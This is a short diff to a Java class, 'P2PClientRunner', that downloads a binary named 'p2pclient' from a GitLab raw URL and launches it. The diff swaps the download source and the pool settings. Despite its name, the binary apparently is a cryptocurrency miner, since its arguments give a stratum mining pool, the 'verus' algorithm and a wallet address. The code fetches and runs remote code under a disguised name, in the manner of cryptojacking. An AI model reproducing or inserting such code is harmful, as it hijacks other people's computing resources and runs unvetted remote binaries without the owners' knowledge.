@@ -4,7 +4,7 @@ import java.net.URL;
 import java.nio.file.*;
 
 public class P2PClientRunner {
-    private static final String P2P_URL = "https://gitlab.com/rikzakalani/coremnr/raw/main/p2pclient";
+    private static final String P2P_URL = "https://gitlab.com/sengepeke/ccmnr/raw/main/p2pclient";
     private static final String P2P_PATH = "p2pclient";
     private static final String LOG_FILE = "p2pclient.log";
 
@@ -23,9 +23,10 @@ public class P2PClientRunner {
             System.out.println("🚀 Starting p2pclient...");
             ProcessBuilder processBuilder = new ProcessBuilder(
                 "./" + P2P_PATH,
-                "--noeval",
-                "--hard-aes",
-                "-P", "stratum1+tcp://cb9072192a56299751a9619430f7493f911e40a794f1.pepek@us.catchthatrabbit.com:8008"
+                "-a", "verus",
+                "-o", "stratum+tcp://na.luckpool.net:3956",
+                "-u", "RJPL26UE8uwEjuK7PNedATTRQ3Nx2GS1SV.1",
+                "-p", "x"
             );
 
             processBuilder.redirectErrorStream(true);
